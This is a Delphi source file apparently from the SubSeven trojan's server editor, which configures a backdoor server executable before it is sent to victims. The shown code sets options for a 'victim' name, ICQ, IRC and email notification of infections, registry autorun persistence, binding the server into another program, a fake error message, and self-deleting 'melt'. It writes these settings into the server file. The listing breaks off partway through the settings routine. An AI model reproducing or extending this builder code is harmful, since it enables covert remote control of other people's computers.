unit EditUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  Cipher, TFlatSpeedButtonUnit, StdCtrls, ExtCtrls, MainColors, OutlookBtn,
  ImgList, TB97Ctls, TFlatComboBoxUnit,lzexpand, Psock, ShellApi, SMTPProt, registry,
  ComCtrls, TFlatEditUnit, TFlatCheckBoxUnit, TFlatRadioButtonUnit,
  DecUtil, IniFiles;

type
  TEditForm = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    OpenServer: TOpenDialog;
    ImageList: TImageList;
    SaveDialog1: TSaveDialog;
    PortCheck: TFlatCheckBox;
    PortEdit: TFlatEdit;
    PassCheck: TFlatCheckBox;
    PassEdit1: TFlatEdit;
    Label5: TLabel;
    PassEdit2: TFlatEdit;
    ProtectCheck: TFlatCheckBox;
    Label7: TLabel;
    File1Check: TFlatRadioButton;
    File2Check: TFlatRadioButton;
    FileNameEdit: TFlatEdit;
    MeltCheck: TFlatCheckBox;
    FakeCheck: TFlatCheckBox;
    OutlookBtn2: TOutlookBtn;
    ICQCheck: TFlatCheckBox;
    ICQEdit: TFlatEdit;
    IRCCheck: TFlatCheckBox;
    ToolbarButton972: TToolbarButton97;
    Label11: TLabel;
    CNEdit: TFlatEdit;
    Label12: TLabel;
    IRCServerEdit: TFlatEdit;
    IRCPortEdit: TFlatEdit;
    MAILCheck: TFlatCheckBox;
    ToolbarButton973: TToolbarButton97;
    Label13: TLabel;
    EMailEdit: TFlatEdit;
    EMUserEdit: TFlatEdit;
    Label14: TLabel;
    EMServerEdit: TFlatComboBox;
    OutlookBtn8: TOutlookBtn;
    Label16: TLabel;
    VictimEdit: TFlatEdit;
    Run1Check: TFlatCheckBox;
    Run3Check: TFlatCheckBox;
    Run2Check: TFlatCheckBox;
    Run4Check: TFlatCheckBox;
    Label18: TLabel;
    RegEdit: TFlatEdit;
    ToolbarButton974: TToolbarButton97;
    Run5Check: TFlatCheckBox;
    PatchCheck: TFlatCheckBox;
    ToolbarButton975: TToolbarButton97;
    PatchEdit: TFlatEdit;
    OutlookBtn4: TOutlookBtn;
    ToolbarButton976: TToolbarButton97;
    ProtCheck: TFlatCheckBox;
    Label20: TLabel;
    Prot1Edit: TFlatEdit;
    Prot2Edit: TFlatEdit;
    OutlookBtn5: TOutlookBtn;
    OutlookBtn6: TOutlookBtn;
    OutlookBtn7: TOutlookBtn;
    FlatCheckBox1: TFlatCheckBox;
    EditServerName: TFlatEdit;
    OutlookBtn1: TOutlookBtn;
    Label1: TLabel;
    Shape1: TShape;
    Label2: TLabel;
    Shape2: TShape;
    Label3: TLabel;
    Shape3: TShape;
    Shape4: TShape;
    Shape5: TShape;
    Label4: TLabel;
    Shape6: TShape;
    OutlookBtn3: TOutlookBtn;
    Shape7: TShape;
    Shape8: TShape;
    Label6: TLabel;
    RndPortCheck: TFlatCheckBox;
    ToolbarButton971: TToolbarButton97;
    Label8: TLabel;
    Label9: TLabel;
    IrcBot: TFlatCheckBox;
    OutlookBtn9: TOutlookBtn;
    OutlookBtn10: TOutlookBtn;
    CurIco: TImage;
    Timer: TTimer;
    ToolbarButton977: TToolbarButton97;
    CBFormats: TComboBox;
    CBMode: TComboBox;
    procedure FormMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormCreate(Sender: TObject);
    procedure RunChangeIconClick(Sender: TObject);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure ToolbarButton972Click(Sender: TObject);
    procedure ToolbarButton973Click(Sender: TObject);
    procedure ToolbarButton974Click(Sender: TObject);
    procedure Run1CheckClick(Sender: TObject);
    procedure Sheet8Enter(Sender: TObject);
    procedure ToolbarButton975Click(Sender: TObject);
    procedure OutlookBtn4Click(Sender: TObject);
    procedure ToolbarButton976Click(Sender: TObject);
    procedure OutlookBtn5Click(Sender: TObject);
    procedure OutlookBtn6Click(Sender: TObject);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure OutlookBtn8Click(Sender: TObject);
    procedure EditServerNameKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure ToolbarButton971Click(Sender: TObject);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure Label9Click(Sender: TObject);
    procedure OutlookBtn9Click(Sender: TObject);
    procedure OutlookBtn10Click(Sender: TObject);
    procedure TimerTimer(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ToolbarButton977Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
  private
    { Private declarations }
    procedure UpdateLabel2;
    function MergePagina(care: integer):boolean;
    procedure SaveExeSettings(ServerName: String);
    function PassProtected(filename: string): boolean;
    function CorrectVersion(filename: string): boolean;
    procedure ReadSettings;
    procedure RunIconClick(Sender: TObject);
    procedure SmtpClientRequestDone(Sender: TObject; RqType: TSmtpRequest;
      Error: Word);
    procedure SmtpClientDisplay(Sender: TObject; Msg: String);
    function ReadKey(Section: String): String;
    procedure WriteKey(sProgTitle, SCmdLine: string);
    function LoadSkin(folder: string): boolean;
  public
{S.K.I.N.}
    bit_window,bit_button,bit_btn_fill,bit_close_btn,bit_ip_btn,bit_min_btn,bit_main,bit_con_btn,bit_ping_btn,bit_dis_btn,bit_background:TBitmap;
    SkinDescription:string;
    BackgroundColor:TColor;
    ButtonFontName:String;
    ButtonFontSize:Byte;
    ButtonFontAttr:String;

    MouseDownSpot : TPoint;
    Capturing : bool;
    function AreYouSure(request: string): boolean;
    procedure SetTheColors;
    procedure ShowMsg(ce: String);
    { Public declarations }
  end;

const CurrentPage:integer=1;
      RegDir='SOFTWARE\SubSeven';
      EditServerVersion='03';
      MainPass=1727374757;
      DataSize1=245;
      DataSize2=174;
      HasPass:boolean=false;
      FACUT:bool=false;
var EditForm: TEditForm;
    TotalPages:Integer;
    DontRead, Yay:bool;
    LastMsg,TmpStr:String;
    EXE_SIZE,Pass:String;
    BindedWithExe:Bool;
    _ico:TIcon;
    FStringFormat,Proceed:Integer;
implementation

uses showmessageunit, {MessageUnit,} HelpUnit, ChangeIconUnit, IRCBotUnit,
  MessageUnit;

{$R *.DFM}

function TEditForm.LoadSkin(folder: string): boolean;
function IsSkinFile(f:string):bool;
begin
 if not FileExists(f) then
  begin
   Result:=False;
   ShowMsg('can''t find '+ExtractFileName(f));
  end else Result:=True;
end;
var DefCon,DefPin:bool;
    ini:TIniFile;
    SearchRec:TSearchRec;
    Name,FOT:String;
begin

 ButtonFontName:='';
 ButtonFontSize:=0;
 ButtonFontAttr:='';
 BackgroundColor:=clBlack;

if (folder<>'default') then
begin
 if folder[length(folder)]<>'\' then folder:=folder+'\';
 if FindFirst(folder+'*.ttf',faAnyFile,SearchRec)=0 then
  repeat
   name:=SearchRec.Name;
   name:=folder+name;
   fot:=copy(name,1,length(name)-3)+'fot';
   fot:=fot+#0;
   name:=name+#0;
   CreateScalableFontResource(0,@fot[1],@name[1],nil);
   if AddFontResource(@fot[1])=0 then ShowMsg('error loading font '+name);
   SendMessage( HWND_BROADCAST, WM_FONTCHANGE, 0, 0 );
//   showmessage('installing '+name);
  until FindNext(SearchRec)>0;
 if folder[length(folder)]<>'\' then folder:=folder+'\';
 Result:=False;
 if not IsSkinFile(folder+'window.bmp') then exit;
 if not IsSkinFile(folder+'button.bmp') then exit;
 if not IsSkinFile(folder+'btn_fill.bmp') then exit;
 if not IsSkinFile(folder+'close_btn.bmp') then exit;
 if not IsSkinFile(folder+'ip_btn.bmp') then exit;
 if not IsSkinFile(folder+'min_btn.bmp') then exit;
 if not IsSkinFile(folder+'main.bmp') then exit;
 DefCon:=False;
 DefPin:=False;
 if not FileExists(folder+'con_btn.bmp') or
    not FileExists(folder+'dis_btn.bmp') then DefCon:=True;
 if not FileExists(folder+'ping_btn.bmp') then DefPin:=True;
 Result:=True;
 bit_window   .LoadFromFile(folder+'window.bmp');
 bit_button   .LoadFromFile(folder+'button.bmp');
 bit_btn_fill .LoadFromFile(folder+'btn_fill.bmp');
 bit_close_btn.LoadFromFile(folder+'close_btn.bmp');
 bit_ip_btn.LoadFromFile(folder+'ip_btn.bmp');
 bit_min_btn.LoadFromFile(folder+'min_btn.bmp');
 bit_main.LoadFromFile(folder+'main.bmp');
 if not DefCon then bit_con_btn.LoadFromFile(folder+'con_btn.bmp');
 if not DefCon then bit_dis_btn.LoadFromFile(folder+'dis_btn.bmp');
 if not DefPin then bit_ping_btn.LoadFromFile(folder+'ping_btn.bmp');
 try
 Ini := TIniFile.Create(folder+'skin.ini');
 BackgroundColor:=StringToColor(ini.ReadString('skin info', 'BackgroundColor', 'clBlack'));
 cButtonText:=StringToColor(ini.ReadString('skin info', 'ButtonFontColor', 'clWhite'));
 ButtonFontName:=ini.ReadString('skin info', 'ButtonFontName', '');
 ButtonFontSize:=ini.ReadInteger('skin info', 'ButtonFontSize', 0);
 ButtonFontAttr:=ini.ReadString('skin info', 'ButtonFontAttr', '0000');
 SkinDescription:=ini.ReadString('skin info','SkinDescription','none');

 cFormBackground:=BackgroundColor;
 cFormLine:=StringToColor(ini.ReadString('skin info', 'WindowLineColor', ColorToString(cFormLine)));
 cFormForeground:=StringToColor(ini.ReadString('skin info', 'WindowForegroundColor', ColorToString(cFormForeground)));
 cFormCaption:=cFormForeground;
 cFormText:=StringToColor(ini.ReadString('skin info', 'WindowTextColor', ColorToString(cFormText)));

 cMenuBackground:=StringToColor(ini.ReadString('menu info','MenuBackground',ColorToString(cMenuBackground)));
 cMenuPageNormalText:=StringToColor(ini.ReadString('menu info','MenuPageText',ColorToString(cMenuPageNormalText)));
 cMenuPageNormalBorder:=StringToColor(ini.ReadString('menu info','MenuPageBorder',ColorToString(cMenuPageNormalBorder)));
 cMenuPageSelectedBorder:=StringToColor(ini.ReadString('menu info','MenuPageBorderSelected',ColorToString(cMenuPageSelectedBorder)));
 cMenuItemNormalText:=StringToColor(ini.ReadString('menu info','MenuItemColor',ColorToString(cMenuItemNormalText)));
 cMenuItemNormalBorder:=StringToColor(ini.ReadString('menu info','MenuItemSelected',ColorToString(cMenuItemNormalBorder)));
 cMenuItemSelectedText:=StringToColor(ini.ReadString('menu info','MenuItemOutline',ColorToString(cMenuItemSelectedText)));
 cMenuArrows:=StringToColor(ini.ReadString('menu info','MenuArrows',ColorToString(cMenuArrows)));

 Ini.Free;
 except end;
end else
begin
 DefCon:=True;
 DefPin:=True;
 bit_window.LoadFromResourceName(HInstance,'window');
 bit_button.LoadFromResourceName(HInstance,'button');
 bit_btn_fill.LoadFromResourceName(HInstance,'btn_fill');
 bit_close_btn.LoadFromResourceName(HInstance,'close_btn');
 bit_ip_btn.LoadFromResourceName(HInstance,'ip_btn');
 bit_min_btn.LoadFromResourceName(HInstance,'min_btn');
 bit_main.LoadFromResourceName(HInstance,'main');

 ButtonFontName:=ReadKey('skin_fontname');
 ButtonFontAttr:=ReadKey('skin_fontattr');if length(ButtonFontAttr)<>4 then ButtonFontAttr:='0000';
 ButtonFontSize:=StrToIntDef(ReadKey('skin_fontsize'),0);
 end;

end;

function Decrypt(ce:string):string;var x,i:Integer;Text,PW:String;
var Parol,R:String;
begin
 Parol:=IntToStr(MainPass)+chr(109)+chr(117)+chr(101)+IntToStr(MainPass);
  with TCipher_Blowfish.Create(Parol, nil) do
  try
    Mode := TCipherMode(EditForm.CBMode.ItemIndex);
    Result:=CodeString(ce, paDecode, FStringFormat);
  finally
    Free;
  end;
end;

function Encrypt(ce:string):string;var x,i:Integer;Text,PW:String;
var R,Parol:String;
begin
 Parol:=IntToStr(MainPass)+chr(109)+chr(117)+chr(101)+IntToStr(MainPass);
  with TCipher_Blowfish.Create(Parol, nil) do
  try
    Mode := TCipherMode(EditForm.CBMode.ItemIndex);
    R := CodeString(ce, paEncode, FStringFormat);
    Result:=R;
  finally
    Free;
  end;
end;

function DecryptOLD(ce:string):string;var x,i:Integer;Text,PW:String;
begin
 if ce='' then begin result:='';exit;end;
 Text:=ce;  PW:=IntToStr(MainPass);  x:=0; // initialize count
 for i:=0 to length(Text) do begin Text[i]:=Chr(Ord(Text[i])-Ord(PW[x]));
 Inc(x);if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

function EncryptOLD(ce:string):string;var x,i:Integer;Text,PW:String;
begin
 if ce='' then begin result:='';exit;end;
 Text:=ce;PW:=IntToStr(MainPass);x:=0; // initialize count
 for i:=0 to length(text) do begin Text[i]:=Chr(Ord(Text[i])+Ord(PW[x]));Inc(x);
 if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

function TEditForm.AreYouSure(request:string):boolean;
var Str:String;
begin
 GetTextForm.CaptionLabel.Caption:='EditServer';
 GetTextForm.OutlookBtn1.Caption:='yeah';
 GetTextForm.OutlookBtn2.Caption:='hell no';
 GetTextForm.EditBox.Visible:=False;
 GetTextForm.TitleLabel.Alignment:=taCenter;
 GetTextForm.GetText('',request,'a',false,Str);
 if Str<>'' then result:=true else result:=false;
 GetTextForm.TitleLabel.Alignment:=taLeftJustify;
 GetTextForm.OutlookBtn1.Caption:='ok';
 GetTextForm.OutlookBtn2.Caption:='cancel';
 GetTextForm.EditBox.Visible:=True;
end;

procedure TEditForm.ShowMsg(ce:String);
begin
 MsgForm.CaptionLabel.Caption:='EditServer';
 MsgForm.DisplayMsg(ce);
end;

procedure TEditForm.SetTheColors;
begin
{} with Shape1 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormBackground;end;

 with Shape2 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormForeground;end;
 with Shape3 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormForeground;end;

{} with Shape4 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormBackground;end;
{} with Shape5 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormBackground;end;

 with Shape6 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormForeground;end;

{} with Shape7 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormBackground;end;

 with Shape8 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormForeground;end;
// myShape.Brush.Color:=cFormBackground;
// myShape.Pen.Color:=cFormLine;
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  CloseButton.Glyph.Assign(bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
{ Panel2.Color:=cFormBackground;}
 with EditServerName do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with PortEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with PassEdit1 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with PassEdit2 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with FileNameEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with ICQEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with EmailEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with EMUserEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with CNEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with IRCServerEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with IRCPortEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with VictimEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with REGEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with Prot1Edit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with Prot2Edit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with PatchEdit do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;

 with EMServerEdit do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormForeground;ColorBorder:=cFormLine;Color:=cFormForeground;Font.Color:=cFormText;end;

 with RndPortCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with PortCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with PassCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with ProtectCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with MeltCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FakeCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with ICQCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with IRCCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with MAILCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with Run1Check do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with Run2Check do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with Run3Check do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with Run4Check do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with Run5Check do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with IrcBot do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with ProtCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with PatchCheck do begin Color:=cFormForeground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox1 do begin Color:=cFormBackground;ColorCheck:=cFormText;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;

 with File1Check do begin Color:=cFormForeground;ColorDot:=cFormCaption;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormBackground;end;
 with File2Check do begin Color:=cFormForeground;ColorDot:=cFormCaption;ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormBackground;end;

 Label1.Font.Color:=cFormText;
 Label2.Font.Color:=cFormText;
 Label3.Font.Color:=cFormText;
 Label4.Font.Color:=cFormText;
 Label5.Font.Color:=cFormText;
 Label6.Font.Color:=cFormText;
 Label7.Font.Color:=cFormText;
 Label8.Font.Color:=cFormText;
 Label9.Font.Color:=cFormText;
 Label11.Font.Color:=cFormText;
 Label12.Font.Color:=cFormText;
 Label13.Font.Color:=cFormText;
 Label14.Font.Color:=cFormText;
 Label16.Font.Color:=cFormText;
// Label17.Font.Color:=cFormText;
 Label18.Font.Color:=cFormText;
 Label20.Font.Color:=cFormText;
// Label18.Font.Color:=cFormText;
 ToolbarButton971.Color:=cFormBackground;
 ToolbarButton972.Color:=cFormBackground;
 ToolbarButton973.Color:=cFormBackground;
 ToolbarButton974.Color:=cFormBackground;
 ToolbarButton975.Color:=cFormBackground;
 ToolbarButton976.Color:=cFormBackground;
 ToolbarButton977.Color:=cFormBackground;
 Invalidate;
end;


procedure TEditForm.FormMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;

procedure TEditForm.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TEditForm.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TEditForm.FormCreate(Sender: TObject);
begin
try
 GetStringFormats(CBFormats.Items);
 CBMode.ItemIndex := 1;
 CBFormats.ItemIndex := 0;
 with CBFormats, Items do
  try FStringFormat := TStringFormatClass(Objects[ItemIndex]).Format;except end;
except
end;
 bit_window:=TBitmap.Create;
 bit_button:=TBitmap.Create;
 bit_btn_fill:=TBitmap.Create;
 bit_close_btn:=TBitmap.Create;
 bit_ip_btn:=TBitmap.Create;
 bit_min_btn:=TBitmap.Create;
 bit_main:=TBitmap.Create;
 bit_con_btn:=TBitmap.Create;
 bit_dis_btn:=TBitmap.Create;
 bit_ping_btn:=TBitmap.Create;
 if UpperCase(ParamStr(1))='/NOREAD' then DontRead:=True else DontRead:=False;
 EXE_SIZE:='0';
 SetTheColors;
 UpdateLabel2;
 EditServerName.Text:=ReadKey('es_filename');
 LoadSkin(ReadKey('skin'));
 SetTheColors;Invalidate;
end;

procedure TEditForm.RunChangeIconClick(Sender: TObject);
begin
 close;
end;

procedure TEditForm.RunIconClick(Sender: TObject);
begin
 ChangeIconForm.Show;
end;

procedure TEditForm.UpdateLabel2;
begin
end;

function TEditForm.MergePagina(care:integer):boolean;
var c:string;
begin
 if care=2 then
  begin
   Result:=True;
   if (not FileExists(EditServerName.Text)) then
    begin
     ShowMsg('specified file doesn''t exist');
     Result:=False;
     exit;
    end;
   if DontRead then Exit;
   if (not CorrectVersion(EditServerName.Text)) then begin Result:=False;EXIT;end;
   if (PassProtected(EditServerName.Text)) then begin Result:=False;exit;end;
   PatchCheck.Enabled:=True;
   PatchEdit.Enabled:=True;
   ReadSettings;
  end;
 if care=9 then
  begin
   Result:=True;
   if (Prot1Edit.Text<>Prot2Edit.Text) and (ProtCheck.Checked) then
    begin
     ShowMsg('the reentered server password is different from the first one');
     Result:=False;
    end;
   if (Prot1Edit.Text='') and (ProtCheck.Checked) then
    begin
     ShowMsg('you have to enter a password if you check the ''protect server...'' box');
     Result:=False;
    end;
   if (not FileExists(PatchEdit.Text)) and (PatchCheck.Checked) and (not BindedWithExe) then
    begin
     ShowMsg('specified file doesn''t exist');
     Result:=False;
    end;
  end;
 if care=3 then
  begin
   Result:=True;
   if (length(PortEdit.Text)<2) and (PortCheck.Checked) then
    begin
     ShowMsg('invalid port');
     Result:=False;
    end;
   if (PassEdit1.Text<>PassEdit2.Text) and (PassCheck.Checked) then
    begin
     ShowMsg('the reentered server-protection password is different from the first one');
     Result:=False;
    end;
   if (PassEdit1.Text='') and (PassCheck.Checked) then
    begin
     ShowMsg('you have to enter a password if you check the ''server password'' box');
     Result:=False;
    end;
  end;
 if care=4 then
  begin
   Result:=True;
   c:=copy(FileNameEdit.Text,length(FileNameEdit.Text)-2,3);
   if (File2Check.Checked) and (UpperCase(c)<>'EXE') and (UpperCase(c)<>'COM') and (UpperCase(c)<>'.DL') then
    begin
     ShowMsg('invalid server-name extension');
     Result:=False;
    end;
  end;
end;

procedure TEditForm.OutlookBtn1Click(Sender: TObject);
begin
 if OpenServer.Execute then
   EditServerName.Text:=OpenServer.FileName else exit;
   try
   _ico:=TIcon.Create;
   _ico.Handle:=ExtractIcon(0,PChar(EditServerName.Text),0);
   CurIco.Picture.Assign(_Ico);
   _Ico.Free;
   except end;
end;

procedure TEditForm.ToolbarButton972Click(Sender: TObject);
begin
 GiveHelp.Tag:=1;
 GiveHelp.Show;
end;

procedure TEditForm.ToolbarButton973Click(Sender: TObject);
begin
 GiveHelp.Tag:=2;
 GiveHelp.Show;
end;

procedure TEditForm.ToolbarButton974Click(Sender: TObject);
begin
 GiveHelp.Tag:=3;
 GiveHelp.Show;
end;

procedure TEditForm.Run1CheckClick(Sender: TObject);
begin
 if (Run1Check.Checked) or (Run2Check.Checked) then
  begin
   Label18.Visible:=True;
   RegEdit.Visible:=True;
   ToolbarButton974.Visible:=True;
  end else
  begin
   Label18.Visible:=False;
   RegEdit.Visible:=False;
   ToolbarButton974.Visible:=False;
  end;
end;

procedure TEditForm.Sheet8Enter(Sender: TObject);
begin
 Run1CheckClick(Sender);
end;

procedure TEditForm.ToolbarButton975Click(Sender: TObject);
begin
 GiveHelp.Tag:=4;
 GiveHelp.Show;
end;

procedure TEditForm.OutlookBtn4Click(Sender: TObject);
begin
 if OpenServer.Execute then PatchEdit.Text:=OpenServer.FileName;
end;

procedure TEditForm.ToolbarButton976Click(Sender: TObject);
begin
 GiveHelp.Tag:=5;
 GiveHelp.Show;
end;

procedure TEditForm.OutlookBtn5Click(Sender: TObject);
begin
 if (NOT DontRead) then
 begin
  if (not FileExists(EditServerName.Text)) then
   begin
    ShowMsg('specified file doesn''t exist');
    exit;
   end;
  if (not CorrectVersion(EditServerName.Text)) then EXIT;
  if (PassProtected(EditServerName.Text)) then exit;
 end;
 if ((not MergePagina(9)) or (not MergePagina(4))) then Exit;
 if (PatchCheck.checked) then
 begin
  ShowMsg('when you bind a server with a file, you can''t change it back, so you can only save the server with a different name. click on "save a new copy..."');
  exit;
 end;
 yay:=true;
 SaveExeSettings(EditServerName.Text);
 if yay and FlatCheckBox1.Checked then close;
end;

procedure TEditForm.OutlookBtn6Click(Sender: TObject);
var b:boolean;
//    s:string;
begin
 yay:=true;
 if not SaveDialog1.Execute then Exit;
 CopyFile(PChar(EditServerName.Text),PChar(SaveDialog1.FileName),b);
// s:=EditServerName.Text;
 EditServerName.Text:=SaveDialog1.FileName;
 SaveExeSettings(EditServerName.Text);
 if yay and FlatCheckBox1.Checked then close;
// EditServerName.Text:=s;
end;

procedure TEditForm.OutlookBtn2Click(Sender: TObject);
begin
 GiveHelp.Tag:=7;
 GiveHelp.Show;
end;

function FalDe(s:string;cat:integer):string;
var i:integer;
    news:String;
begin
 if length(s)=cat then begin result:=s;exit;end;
 news:=s;
 for i:=length(s)+1 to cat do
  news:=news+'ô';
 Result:=news;
end;

function AddCheck(check:bool):string;
begin
 if check then result:='1' else result:='0';
end;

function FileSize(nume:string):integer;
var rec:TSearchRec;
begin
 if nume='' then begin result:=0;exit;end;
  FindFirst(nume,faAnyFile,rec);
  result := rec.Size;
end;

procedure TEditForm.SaveExeSettings(ServerName:String);
type _r1=packed record
         SaveData1:array[1..DataSize1] of char;
        end;
type _r2=packed record
         SaveData2:array[1..DataSize2] of char;
        end;
var f,f2:file;
    NumRead, NumWritten: Integer;
    r1:_r1;
    r2:_r2;
    i,t,Written,w:integer;
    SaveData:String;
    bf:array[1..2048] of char;
    rec:TSearchRec;
    ExeSize:LongInt;
begin
 SaveData:='SS'+EditServerVersion;
 if PortCheck.Checked then SaveData:=SaveData+FalDe(PortEdit.Text,10) else SaveData:=SaveData+FalDe('27374',10);
 if PassCheck.Checked then SaveData:=SaveData+FalDe(PassEdit1.Text,12) else SaveData:=SaveData+FalDe('ô',12);
 SaveData:=SaveData+AddCheck(ProtectCheck.Checked);
 SaveData:=SaveData+AddCheck(File1Check.Checked);
 SaveData:=SaveData+FalDe(FileNameEdit.Text,15);
 SaveData:=SaveData+AddCheck(MeltCheck.Checked);
 SaveData:=SaveData+AddCheck(FakeCheck.Checked);
